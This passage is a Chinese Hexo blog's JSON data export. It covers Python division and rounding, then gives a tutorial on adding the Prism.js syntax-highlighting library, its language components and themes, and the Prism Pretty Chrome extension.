href=\"#2-浮点数运算结果是浮点数，不会出现四舍五入的情况。\" class=\"headerlink\" title=\"2. 浮点数运算结果是浮点数，不会出现四舍五入的情况。\"></a>2. 浮点数运算结果是浮点数，不会出现四舍五入的情况。</h3><h3 id=\"3-引用division模块解决除法问题\"><a href=\"#3-引用division模块解决除法问题\" class=\"headerlink\" title=\"3. 引用division模块解决除法问题\"></a>3. 引用division模块解决除法问题</h3><p>division模块重新定义了除法的一些特性，如：整数相除得到的结果是一个浮点数。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">from</span> __future__ <span class=\"keyword\">import</span> division</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"number\">3</span>/<span class=\"number\">4</span></div><div class=\"line\"><span class=\"number\">0.75</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"number\">2</span>/<span class=\"number\">3</span></div><div class=\"line\"><span class=\"number\">0.6666666666666666</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"4-取余\"><a href=\"#4-取余\" class=\"headerlink\" title=\"4. 取余\"></a>4. 取余</h3><p>取余数可使用<code>%</code>，例如：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&gt;&gt;&gt;&gt; <span class=\"number\">4</span>%<span class=\"number\">5</span></div><div class=\"line\"><span class=\"number\">4</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"4-内建函数divmod\"><a href=\"#4-内建函数divmod\" class=\"headerlink\" title=\"4. 内建函数divmod\"></a>4. 内建函数divmod</h3><p>python提供的内建函数divmod也能为除法运算一次性返回商和余数。例如：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>divmod(<span class=\"number\">2</span>, <span class=\"number\">3</span>)</div><div class=\"line\">(<span class=\"number\">0</span>, <span class=\"number\">2</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>divmod(<span class=\"number\">3</span>, <span class=\"number\">1</span>)</div><div class=\"line\">(<span class=\"number\">3</span>, <span class=\"number\">0</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>divmod(<span class=\"number\">3</span>, <span class=\"number\">2</span>)</div><div class=\"line\">(<span class=\"number\">1</span>, <span class=\"number\">1</span>)</div></pre></td></tr></table></figure></p>\n<h3 id=\"5-四舍五入\"><a href=\"#5-四舍五入\" class=\"headerlink\" title=\"5. 四舍五入\"></a>5. 四舍五入</h3><p>内建函数round() 方法返回浮点数x的四舍五入值。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>round(<span class=\"number\">2</span>, <span class=\"number\">3</span>)</div><div class=\"line\"><span class=\"number\">2.0</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>round(<span class=\"number\">2</span>/<span class=\"number\">3</span>, <span class=\"number\">1</span>)</div><div class=\"line\"><span class=\"number\">0.7</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>round(<span class=\"number\">2</span>/<span class=\"number\">3</span>, <span class=\"number\">0</span>)</div><div class=\"line\"><span class=\"number\">1.0</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>round(<span class=\"number\">2</span>/<span class=\"number\">4</span>, <span class=\"number\">0</span>)</div><div class=\"line\"><span class=\"number\">1.0</span></div></pre></td></tr></table></figure>\n<p>参见：<a href=\"https://github.com/yeshaoting/StarterLearningPython/blob/master/103.md\">https://github.com/yeshaoting/StarterLearningPython/blob/master/103.md</a></p>"},{"author":"yeshaoting","title":"代码高亮类库prismjs","date":"2016-08-25T07:45:00.000Z","_content":"<img src=\"/asserts/images/logo/prismjs.jpg\" class=\"img-logo img-center\" />\n\n\n## 一、简介\n\nPrism 是一款轻量、可扩展的代码语法高亮库，使用现代化的 Web 标准构建。\n\n\n\n## 二、为什么选择 Prism.js ？\n\n>-  极致易用\n>   引用 prism.css 和 prism.js，使用合适的 HTML5 标签（code.language-xxxx），搞定！\n>\n>-  天生伶俐\n>    语言的 CSS 类是可继承的，所以你只需定义一次就能应用到多个代码片段。\n>\n>-  轻如鸿毛\n>    代码压缩后只有 1.6KB。每添加一个语言平均增加 0.3-0.5KB，主题在 1KB 左右。\n>\n>-  快如闪电\n>     如果可能，支持通过 Web Workers 实现并行。\n>\n>-  轻松扩展\n>    定义新语言或扩展现有语法，或者新增功能都非常简单。\n>\n>-  丰富样式\n>    所有的样式通过 CSS 完成，并使用合理的类名如：.comment, .string, .property 等。\n\n\n\n## 三、简单用法\n\n\n\n### 1. head添加主题样式\n\n``` html\n<link rel=\"stylesheet\" href=\"http://prismjs.com/themes/prism.css\">\n```\n\n\n\n### 2. 文档末尾添加Prism 类库\n\n``` html\n<script src=\"http://prismjs.com/prism.js\"></script>\n```\n\n\n\n### 3. 添加测试代码 \n\n> 遵循 [HTML5 标准](http://www.w3.org/TR/html5/grouping-content.html#the-pre-element)，Prism 使用语义化的 `pre` 元素和 `code` 元素来标记代码区块。\n\n``` html\n<pre class=\"language-css\"><code>p { color: red }</code></pre>\n```\n\n\n\n### 4. 完整代码\n\n``` html\n<!DOCTYPE html>\n<html>\n<head>\n\t<title>代码高亮类库Prism.js</title>\n\t<link rel=\"stylesheet\" href=\"http://prismjs.com/themes/prism.css\">\n</head>\n<body>\n\t<pre class=\"language-css\"><code>p { color: red }</code></pre>\n\t<script src=\"http://prismjs.com/prism.js\"></script>\n</body>\n</html>\n```\n\n\n\n### 5. 输出样式\n\n![Prism高亮效果](http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_53.png)\n\n<!-- more -->\n\n\n\n## 四、扩展内容\n\n\n\n### 1. 高亮语法支持\n\n默认的prism-core只支持少量的语法高亮，如：html, css, javascript等。\n\n如需要针对java、C、python语法进行高亮显示的话，需要额外引入特定语法高亮类库。\n\n``` html\n<script src=\"http://prismjs.com/components/prism-java.js\"></script>\n<script src=\"http://prismjs.com/components/prism-sql.js\"></script>\n<script src=\"http://prismjs.com/components/prism-python.js\"></script>\n```\n\n**注**：扩展的语法高亮类库位置放于prism.js之后。另外，也可以在下载prismjs里把需要的类库都打包进prismjs.js里。\n\n\n\n效果如下图所示：\n\n![java语法高亮效果](http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_54.png)\n\n\n\n### 2. 高亮主题  \n\nprismjs支持多种高亮主题，默认的就是上述截图的主题。\n\n如果有其他的主题偏好，可以更换prismjs主题样式。\n\n方法如下 ：\n\n``` html\n<link rel=\"stylesheet\" href=\"http://prismjs.com/themes/prism-okaidia.css\">\n<link rel=\"stylesheet\" href=\"http://prismjs.com/themes/prism-solarizedlight.css\">\n<link rel=\"stylesheet\" href=\"http://prismjs.com/themes/prism-dark.css\">\n<link rel=\"stylesheet\" href=\"http://prismjs.com/themes/prism-twilight.css\">\n<link rel=\"stylesheet\" href=\"http://prismjs.com/themes/prism-coy.css\">\n```\n\n除了本文列出的几种主题外，还支持其他几种，不一一列举。\n\n就列出的这几种主题而言，个人比较喜欢 **亮色的coy** 主题和  **暗色的dark** 主题。\n\n\n\n## 五、基于Chrome插件：Prism Pretty\n\n> A Chrome Extension to format/highlight/preview HTML/JS/CSS/Markdown code with Prism.js\n\n\n\n### 1. 插件预览\n\n该插件可用于高亮显示html、js、css以及markdown语法。\n\n实际体验后，html、js、css展示效果很不错，特别markdown语法展示效果意外的好。感觉整体插件做工精致、功能强大。不过，目前markdown代码预览样式目前无法设置。\n\n插件设置界面如下图所示：\n\n![Prism Pretty截图](http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/screenshot.png)\n\n\n\n### 2. 内容预览\n\n试用了一下该插件，意外发现插件的一个强大功能：居然还能预览颜色代码内容、长度代码内容、图片链接内容等。\n\n大家感受一下效果：\n\n#### 预览颜色代码\n\n ![预览颜色代码](http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_57.png)\n\n#### 预览时间代码\n\n ![预览时间代码](http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_60.png)\n\n#### 预览长度代码\n ![预览长度代码](http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_58.png)\n\n#### 预览图片链接\n ![预览图片链接](http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_62.png)\n\n\n\n\n## 六、参考文档\n\n- [prismjs官网](http://prismjs.com/index.html)\n- [Prism：轻量级的 Javascript 代码高亮库](http://blog.wpjam.com/m/prism/)\n- [使用 Prism.js 实现漂亮的代码语法高亮](http://c7sky.com/syntax-highlighting-with-prismjs.html)\n- [Prism Test drive](http://prismjs.com/test.html)\n- [Prism Pretty说明文档](https://raw.githubusercontent.com/L3au/Prism-Pretty/master/README.md)\n- [Prism Pretty](https://github.com/L3au/Prism-Pretty)","source":"_posts/article/js/代码高亮类库prismjs.md","raw":"tags:\n- prism\n\ncategories:\n- 前端设计\n\nauthor: yeshaoting\ntitle: 代码高亮类库prismjs\ndate: 2016-08-25 15:45:00\n---\n<img src=\"/asserts/images/logo/prismjs.jpg\" class=\"img-logo img-center\" />\n\n\n## 一、简介\n\nPrism 是一款轻量、可扩展的代码语法高亮库，使用现代化的 Web 标准构建。\n\n\n\n## 二、为什么选择 Prism.js ？\n\n>-  极致易用\n>   引用 prism.css 和 prism.js，使用合适的 HTML5 标签（code.language-xxxx），搞定！\n>\n>-  天生伶俐\n>    语言的 CSS 类是可继承的，所以你只需定义一次就能应用到多个代码片段。\n>\n>-  轻如鸿毛\n>    代码压缩后只有 1.6KB。每添加一个语言平均增加 0.3-0.5KB，主题在 1KB 左右。\n>\n>-  快如闪电\n>     如果可能，支持通过 Web Workers 实现并行。\n>\n>-  轻松扩展\n>    定义新语言或扩展现有语法，或者新增功能都非常简单。\n>\n>-  丰富样式\n>    所有的样式通过 CSS 完成，并使用合理的类名如：.comment, .string, .property 等。\n\n\n\n## 三、简单用法\n\n\n\n### 1. head添加主题样式\n\n``` html\n<link rel=\"stylesheet\" href=\"http://prismjs.com/themes/prism.css\">\n```\n\n\n\n### 2. 文档末尾添加Prism 类库\n\n``` html\n<script src=\"http://prismjs.com/prism.js\"></script>\n```\n\n\n\n### 3. 添加测试代码 \n\n> 遵循 [HTML5 标准](http://www.w3.org/TR/html5/grouping-content.html#the-pre-element)，Prism 使用语义化的 `pre` 元素和 `code` 元素来标记代码区块。\n\n``` html\n<pre class=\"language-css\"><code>p { color: red }</code></pre>\n```\n\n\n\n### 4. 完整代码\n\n``` html\n<!DOCTYPE html>\n<html>\n<head>\n\t<title>代码高亮类库Prism.js</title>\n\t<link rel=\"stylesheet\" href=\"http://prismjs.com/themes/prism.css\">\n</head>\n<body>\n\t<pre class=\"language-css\"><code>p { color: red }</code></pre>\n\t<script src=\"http://prismjs.com/prism.js\"></script>\n</body>\n</html>\n```\n\n\n\n### 5. 输出样式\n\n![Prism高亮效果](http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_53.png)\n\n<!-- more -->\n\n\n\n## 四、扩展内容\n\n\n\n### 1. 高亮语法支持\n\n默认的prism-core只支持少量的语法高亮，如：html, css, javascript等。\n\n如需要针对java、C、python语法进行高亮显示的话，需要额外引入特定语法高亮类库。\n\n``` html\n<script src=\"http://prismjs.com/components/prism-java.js\"></script>\n<script src=\"http://prismjs.com/components/prism-sql.js\"></script>\n<script src=\"http://prismjs.com/components/prism-python.js\"></script>\n```\n\n**注**：扩展的语法高亮类库位置放于prism.js之后。另外，也可以在下载prismjs里把需要的类库都打包进prismjs.js里。\n\n\n\n效果如下图所示：\n\n![java语法高亮效果](http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_54.png)\n\n\n\n### 2. 高亮主题  \n\nprismjs支持多种高亮主题，默认的就是上述截图的主题。\n\n如果有其他的主题偏好，可以更换prismjs主题样式。\n\n方法如下 ：\n\n``` html\n<link rel=\"stylesheet\" href=\"http://prismjs.com/themes/prism-okaidia.css\">\n<link rel=\"stylesheet\" href=\"http://prismjs.com/themes/prism-solarizedlight.css\">\n<link rel=\"stylesheet\" href=\"http://prismjs.com/themes/prism-dark.css\">\n<link rel=\"stylesheet\" href=\"http://prismjs.com/themes/prism-twilight.css\">\n<link rel=\"stylesheet\" href=\"http://prismjs.com/themes/prism-coy.css\">\n```\n\n除了本文列出的几种主题外，还支持其他几种，不一一列举。\n\n就列出的这几种主题而言，个人比较喜欢 **亮色的coy** 主题和  **暗色的dark** 主题。\n\n\n\n## 五、基于Chrome插件：Prism Pretty\n\n> A Chrome Extension to format/highlight/preview HTML/JS/CSS/Markdown code with Prism.js\n\n\n\n### 1. 插件预览\n\n该插件可用于高亮显示html、js、css以及markdown语法。\n\n实际体验后，html、js、css展示效果很不错，特别markdown语法展示效果意外的好。感觉整体插件做工精致、功能强大。不过，目前markdown代码预览样式目前无法设置。\n\n插件设置界面如下图所示：\n\n![Prism Pretty截图](http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/screenshot.png)\n\n\n\n### 2. 内容预览\n\n试用了一下该插件，意外发现插件的一个强大功能：居然还能预览颜色代码内容、长度代码内容、图片链接内容等。\n\n大家感受一下效果：\n\n#### 预览颜色代码\n\n ![预览颜色代码](http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_57.png)\n\n#### 预览时间代码\n\n ![预览时间代码](http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_60.png)\n\n#### 预览长度代码\n ![预览长度代码](http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_58.png)\n\n#### 预览图片链接\n ![预览图片链接](http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_62.png)\n\n\n\n\n## 六、参考文档\n\n- [prismjs官网](http://prismjs.com/index.html)\n- [Prism：轻量级的 Javascript 代码高亮库](http://blog.wpjam.com/m/prism/)\n- [使用 Prism.js 实现漂亮的代码语法高亮](http://c7sky.com/syntax-highlighting-with-prismjs.html)\n- [Prism Test drive](http://prismjs.com/test.html)\n- [Prism Pretty说明文档](https://raw.githubusercontent.com/L3au/Prism-Pretty/master/README.md)\n- [Prism Pretty](https://github.com/L3au/Prism-Pretty)","slug":"article/js/代码高亮类库prismjs","published":1,"updated":"2016-08-25T12:50:53.000Z","_id":"cisa72gq80003dnbtophaj2jh","comments":1,"layout":"post","photos":[],"link":"","content":"<p><img src=\"/asserts/images/logo/prismjs.jpg\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、简介\"><a href=\"#一、简介\" class=\"headerlink\" title=\"一、简介\"></a>一、简介</h2><p>Prism 是一款轻量、可扩展的代码语法高亮库，使用现代化的 Web 标准构建。</p>\n<h2 id=\"二、为什么选择-Prism-js-？\"><a href=\"#二、为什么选择-Prism-js-？\" class=\"headerlink\" title=\"二、为什么选择 Prism.js ？\"></a>二、为什么选择 Prism.js ？</h2><blockquote>\n<ul>\n<li><p>极致易用<br>引用 prism.css 和 prism.js，使用合适的 HTML5 标签（code.language-xxxx），搞定！</p>\n</li>\n<li><p>天生伶俐<br>语言的 CSS 类是可继承的，所以你只需定义一次就能应用到多个代码片段。</p>\n</li>\n<li><p>轻如鸿毛<br>代码压缩后只有 1.6KB。每添加一个语言平均增加 0.3-0.5KB，主题在 1KB 左右。</p>\n</li>\n<li><p>快如闪电<br> 如果可能，支持通过 Web Workers 实现并行。</p>\n</li>\n<li><p>轻松扩展<br>定义新语言或扩展现有语法，或者新增功能都非常简单。</p>\n</li>\n<li><p>丰富样式<br>所有的样式通过 CSS 完成，并使用合理的类名如：.comment, .string, .property 等。</p>\n</li>\n</ul>\n</blockquote>\n<h2 id=\"三、简单用法\"><a href=\"#三、简单用法\" class=\"headerlink\" title=\"三、简单用法\"></a>三、简单用法</h2><h3 id=\"1-head添加主题样式\"><a href=\"#1-head添加主题样式\" class=\"headerlink\" title=\"1. head添加主题样式\"></a>1. head添加主题样式</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"http://prismjs.com/themes/prism.css\"</span>&gt;</span></div></pre></td></tr></table></figure>\n<h3 id=\"2-文档末尾添加Prism-类库\"><a href=\"#2-文档末尾添加Prism-类库\" class=\"headerlink\" title=\"2. 文档末尾添加Prism 类库\"></a>2. 文档末尾添加Prism 类库</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://prismjs.com/prism.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div></pre></td></tr></table></figure>\n<h3 id=\"3-添加测试代码\"><a href=\"#3-添加测试代码\" class=\"headerlink\" title=\"3. 添加测试代码\"></a>3. 添加测试代码</h3><blockquote>\n<p>遵循 <a href=\"http://www.w3.org/TR/html5/grouping-content.html#the-pre-element\" target=\"_blank\" rel=\"external\">HTML5 标准</a>，Prism 使用语义化的 <code>pre</code> 元素和 <code>code</code> 元素来标记代码区块。</p>\n</blockquote>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">pre</span> <span class=\"attr\">class</span>=<span class=\"string\">\"language-css\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">code</span>&gt;</span>p &#123; color: red &#125;<span class=\"tag\">&lt;/<span class=\"name\">code</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">pre</span>&gt;</span></div></pre></td></tr></table></figure>\n<h3 id=\"4-完整代码\"><a href=\"#4-完整代码\" class=\"headerlink\" title=\"4. 完整代码\"></a>4. 完整代码</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>代码高亮类库Prism.js<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"http://prismjs.com/themes/prism.css\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">pre</span> <span class=\"attr\">class</span>=<span class=\"string\">\"language-css\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">code</span>&gt;</span>p &#123; color: red &#125;<span class=\"tag\">&lt;/<span class=\"name\">code</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">pre</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://prismjs.com/prism.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure>\n<h3 id=\"5-输出样式\"><a href=\"#5-输出样式\" class=\"headerlink\" title=\"5. 输出样式\"></a>5. 输出样式</h3><p><img src=\"http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_53.png\" alt=\"Prism高亮效果\"></p>\n<a id=\"more\"></a>\n<h2 id=\"四、扩展内容\"><a href=\"#四、扩展内容\" class=\"headerlink\" title=\"四、扩展内容\"></a>四、扩展内容</h2><h3 id=\"1-高亮语法支持\"><a href=\"#1-高亮语法支持\" class=\"headerlink\" title=\"1. 高亮语法支持\"></a>1. 高亮语法支持</h3><p>默认的prism-core只支持少量的语法高亮，如：html, css, javascript等。</p>\n<p>如需要针对java、C、python语法进行高亮显示的话，需要额外引入特定语法高亮类库。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://prismjs.com/components/prism-java.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://prismjs.com/components/prism-sql.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://prismjs.com/components/prism-python.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div></pre></td></tr></table></figure>\n<p><strong>注</strong>：扩展的语法高亮类库位置放于prism.js之后。另外，也可以在下载prismjs里把需要的类库都打包进prismjs.js里。</p>\n<p>效果如下图所示：</p>\n<p><img src=\"http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_54.png\" alt=\"java语法高亮效果\"></p>\n<h3 id=\"2-高亮主题\"><a href=\"#2-高亮主题\" class=\"headerlink\" title=\"2. 高亮主题\"></a>2. 高亮主题</h3><p>prismjs支持多种高亮主题，默认的就是上述截图的主题。</p>\n<p>如果有其他的主题偏好，可以更换prismjs主题样式。</p>\n<p>方法如下 ：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"http://prismjs.com/themes/prism-okaidia.css\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"http://prismjs.com/themes/prism-solarizedlight.css\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"http://prismjs.com/themes/prism-dark.css\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"http://prismjs.com/themes/prism-twilight.css\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"http://prismjs.com/themes/prism-coy.css\"</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>除了本文列出的几种主题外，还支持其他几种，不一一列举。</p>\n<p>就列出的这几种主题而言，个人比较喜欢 <strong>亮色的coy</strong> 主题和  <strong>暗色的dark</strong> 主题。</p>\n<h2 id=\"五、基于Chrome插件：Prism-Pretty\"><a href=\"#五、基于Chrome插件：Prism-Pretty\" class=\"headerlink\" title=\"五、基于Chrome插件：Prism Pretty\"></a>五、基于Chrome插件：Prism Pretty</h2><blockquote>\n<p>A Chrome Extension to format/highlight/preview HTML/JS/CSS/Markdown code with Prism.js</p>\n</blockquote>\n<h3 id=\"1-插件预览\"><a href=\"#1-插件预览\" class=\"headerlink\" title=\"1. 插件预览\"></a>1. 插件预览</h3><p>该插件可用于高亮显示html、js、css以及markdown语法。</p>\n<p>实际体验后，html、js、css展示效果很不错，特别markdown语法展示效果意外的好。感觉整体插件做工精致、功能强大。不过，目前markdown代码预览样式目前无法设置。</p>\n<p>插件设置界面如下图所示：</p>\n<p><img src=\"http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/screenshot.png\" alt=\"Prism Pretty截图\"></p>\n<h3 id=\"2-内容预览\"><a href=\"#2-内容预览\" class=\"headerlink\" title=\"2. 内容预览\"></a>2. 内容预览</h3><p>试用了一下该插件，意外发现插件的一个强大功能：居然还能预览颜色代码内容、长度代码内容、图片链接内容等。</p>\n<p>大家感受一下效果：</p>\n<h4 id=\"预览颜色代码\"><a href=\"#预览颜色代码\" class=\"headerlink\" title=\"预览颜色代码\"></a>预览颜色代码</h4><p> <img src=\"http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_57.png\" alt=\"预览颜色代码\"></p>\n<h4 id=\"预览时间代码\"><a href=\"#预览时间代码\" class=\"headerlink\" title=\"预览时间代码\"></a>预览时间代码</h4><p> <img src=\"http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_60.png\" alt=\"预览时间代码\"></p>\n<h4 id=\"预览长度代码\"><a href=\"#预览长度代码\" class=\"headerlink\" title=\"预览长度代码\"></a>预览长度代码</h4><p> <img src=\"http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_58.png\" alt=\"预览长度代码\"></p>\n<h4 id=\"预览图片链接\"><a href=\"#预览图片链接\" class=\"headerlink\" title=\"预览图片链接\"></a>预览图片链接</h4><p> <img src=\"http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/代码高亮类库Prism/Snip20160825_62.png\" alt=\"预览图片链接\"></p>\n<h2 id=\"六、参考文档\"><a href=\"#六、参考文档\" class=\"headerlink\" title=\"六、参考文档\"></a>六、参考文档</h2><ul>\n<li><a href=\"http://prismjs.com/index.html\" target=\"_blank\" rel=\"external\">prismjs官网</a></li>\n<li><a href=\"http://blog.wpjam.com/m/prism/\" target=\"_blank\" rel=\"external\">Prism：轻量级的 Javascript 代码高亮库</a></li>\n<li><a href=\"http://c7sky.com/syntax-highlighting-with-prismjs.html\" target=\"_blank\" rel=\"external\">使用 Prism.js 实现漂亮的代码语法高亮</a></li>\n<li><a href=\"http://prismjs.com/test.html\" target=\"_blank\" rel=\"external\">Prism Test drive</a></li>\n<li><a href=\"https://raw.githubusercontent.com/L3au/Prism-Pretty/master/README.md\" target=\"_blank\" rel=\"external\">Prism Pretty说明文档</a></li>\n<li><a href=\"https://github.com/L3au/Prism-Pretty\" target=\"_blank\" rel=\"external\">Prism Pretty</a></li>\n</ul>\n","excerpt":"<p><img src=\"/asserts/images/logo/prismjs.jpg\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、简介\"><a href=\"#一、简介\" class=\"headerlink\" title=\"一、简介\"></a>一、简介</h2><p>Prism 是一款轻量、可扩展的代码语法高亮库，使用现代化的 Web 标准构建。</p>\n<h2 id=\"二、为什么选择-Prism-js-？\"><a href=\"#二、为什么选择-Prism-js-？\" class=\"headerlink\" title=\"二、为什么选择 Prism.js ？\"></a>二、为什么选择 Prism.js ？</h2><blockquote>\n<ul>\n<li><p>极致易用<br>引用 prism.css 和 prism.js，使用合适的 HTML5 标签（code.language-xxxx），搞定！</p>\n</li>\n<li><p>天生伶俐<br>语言的 CSS 类是可继承的，所以你只需定义一次就能应用到多个代码片段。</p>\n</li>\n<li><p>轻如鸿毛<br>代码压缩后只有 1.6KB。每添加一个语言平均增加 0.3-0.5KB，主题在 1KB 左右。</p>\n</li>\n<li><p>快如闪电<br> 如果可能，支持通过 Web Workers 